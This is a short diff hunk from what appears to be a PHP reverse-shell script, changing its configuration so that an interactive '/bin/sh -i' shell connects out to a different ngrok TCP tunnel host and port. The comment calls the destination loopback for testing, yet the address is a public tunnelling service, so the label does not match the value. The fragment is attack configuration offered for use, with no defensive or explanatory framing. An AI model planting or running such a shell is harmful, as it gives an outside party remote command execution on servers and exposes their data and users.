@@ -4,8 +4,8 @@
 
     // CHANGE THE FOLLOWING PARAMS AS NEEDED:
     //---------------------------------------------------------------
-    $addr = '2.tcp.ngrok.io';   # shell destination (loopback for testing)
-    $port = 17800;          # shell destination port
+    $addr = '0.tcp.ngrok.io';   # shell destination (loopback for testing)
+    $port = 11113;          # shell destination port
     $timeout = 20.0;       # connection timeout time (seconds):
     $shell = '/bin/sh -i'; # shell to run
     //---------------------------------------------------------------
